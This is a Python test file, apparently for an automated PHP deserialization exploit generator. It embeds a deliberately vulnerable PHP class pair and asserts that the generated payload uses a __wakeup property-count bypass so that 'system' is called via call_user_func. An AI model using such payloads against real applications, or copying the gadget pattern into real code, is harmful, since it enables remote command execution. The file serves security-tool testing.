import pytest
from core_v2.engine import Sd0pEngineV2

def test_pop_chain_with_wakeup_bypass():
    engine = Sd0pEngineV2()
    
    code = """
    <?php
    class A {
        public $cmd;
        public function __destruct() {
            new B($this->cmd);
        }
    }
    class B {
        public $func;
        public $param;
        public function __construct($param) {
            $this->func = 'system';
            $this->param = $param;
        }
        public function __wakeup() {
            $this->func = 'htmlspecialchars';
        }
        public function __destruct() {
            call_user_func($this->func, $this->param);
        }
    }
    ?>
    """
    payload = engine.analyze_and_generate(code)
    
    print(f"Generated Payload: {repr(payload)}")
    
    # 验证关键点
    assert "O:1:\"A\":1:{" in payload
    assert "s:3:\"cmd\";O:1:\"B\":" in payload
    
    # 验证 B 类的 __wakeup 绕过 (属性计数应为 3: func, param, _dummy_bypass)
    assert "O:1:\"B\":3:{" in payload, f"B class wakeup bypass failed: {payload}"
    
    # 验证 func 保持为 system
    assert "s:4:\"func\";s:6:\"system\";" in payload
    
    print("✅ POP Chain with __wakeup bypass test passed!")

if __name__ == "__main__":
    test_pop_chain_with_wakeup_bypass()
